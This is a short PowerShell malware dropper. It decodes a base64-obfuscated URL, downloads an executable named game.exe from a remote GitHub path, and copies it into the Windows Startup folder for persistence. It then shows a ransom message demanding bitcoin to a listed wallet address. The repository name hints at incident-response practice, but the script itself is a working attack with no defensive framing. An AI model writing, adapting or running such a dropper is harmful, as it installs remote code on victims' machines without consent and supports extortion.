$startup_folder = "C:\User\" + $env:USERNAME + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
$quick_access = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
$encoded_url = "aHR0cHM6Ly9naXRodWIuY29tL29sZ2VyMzQ2L3BzLWlyLXNjcmlwdHMvcmF3L21haW4vZ2FtZS5leGUK" 
$DECODED = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded_url))
$decoded2 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded_url))
$context = "C:\Users\" + $env:USERNAME + "\"
$stager = $context + "game.exe"
Invoke-WebRequest -Uri $decoded2 -outfile $stager
$persistence = $context + "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Write-Output $persistence
copy $stager $persistence
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Your System has been compromised, send bitcoins to the following address :) n1tPJjSiq5Sh8ShzciFuLUaX7B8bxzkQMQ')